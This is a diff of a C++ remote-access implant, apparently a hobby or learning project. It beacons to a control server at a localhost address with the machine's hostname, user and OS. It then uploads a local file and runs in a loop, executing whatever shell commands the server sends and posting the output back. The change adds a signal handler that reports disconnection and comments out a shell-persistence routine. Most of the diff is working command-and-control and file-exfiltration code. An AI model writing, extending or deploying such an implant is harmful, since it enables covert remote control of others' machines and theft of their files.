@@ -1,16 +1,16 @@
 #include <string>
-//#include <stdio.h>
-//#include <stdlib.h>
 #include <thread>
 #include <chrono>
 #include <iostream>
-#include "curl/curl.h"
-#include <sys/stat.h>
 #include <fstream>
+#include <csignal>
+
+#include "curl/curl.h"
 
 using namespace std; 
 
 const string HOST_URL = "http://127.0.0.1:3000/";
+string ID;
 
 string get_os() {
     #ifdef _WIN32
@@ -193,31 +193,36 @@ void make_shell_persistance() {
     }
 }
 
+void signalHandler(int signum) {
+    cout << "Interrupt signal (" << signum << ") received." << endl;
+    post(HOST_URL + "disconnect", "id=" + ID);
+    exit(signum);
+}
+
 int main() {
     string hostname = exec("hostname");
     string user = exec("id -un");
     string os = get_os();
 
-    make_shell_persistance();
+    signal(SIGINT, signalHandler);
 
-    string id = "";
-    while(id == "")
-    {
-        id = post(HOST_URL + "connect", "hostname=" + hostname +
+    //make_shell_persistance();
+
+    do {
+        ID = post(HOST_URL + "connect", "hostname=" + hostname +
                 "&user=" + user + "&os=" + os);
         this_thread::sleep_for(chrono::seconds(3));
-    }
+    } while (ID.empty());
 
     // Local file test
-    upload_file(HOST_URL + "upload", "/home/brett/0.jpg", id);
-
+    upload_file(HOST_URL + "upload", "/home/brett/0.jpg", ID);
 
     while (true) {
-        string command = post(HOST_URL + "command", "id=" + id);
+        string command = post(HOST_URL + "command", "id=" + ID);
 
         if (!command.empty()) {
             string output = exec(command);
-            post(HOST_URL + "output", "id=" + id + "&output=" + output);
+            post(HOST_URL + "output", "id=" + ID + "&output=" + output);
         }
 
         this_thread::sleep_for(chrono::seconds(3));
